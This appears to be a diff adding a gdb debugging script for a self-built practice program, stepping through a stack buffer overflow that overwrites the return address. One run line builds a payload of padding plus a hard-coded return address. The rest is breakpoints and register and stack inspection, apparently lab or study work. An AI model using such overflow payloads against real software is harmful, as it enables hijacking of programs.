@@ -1,0 +1,33 @@
+#gcc -ggdb -o stack_ret_overwrite stack_ret_overwrite.c 
+file stack_ret_overwrite
+break *main+0
+break *main+280
+break *main+298
+break *main+305
+break *main+310
+break *main+322
+#r `python -c 'print "C"*60+"hola"'`
+r `python -c 'print "C"*120+"ca48555555550000".decode("hex")'`
+## ret addr @ 0x7fffffffe520 should be --> 0x5555555548ca
+## LibcRet 0x00007ffff7a5c2b1
+info proc mappings
+disas
+info registers rsp rbp rip
+si
+si
+info registers rsp rbp rip
+si
+info registers rsp rbp rsi rdi rip
+## Hello
+n
+x/64hx $rsp
+si #
+x/64hx $rsp
+n
+n
+n
+n
+n
+x/64hx $rsp
+n
+x/64hx $rsp
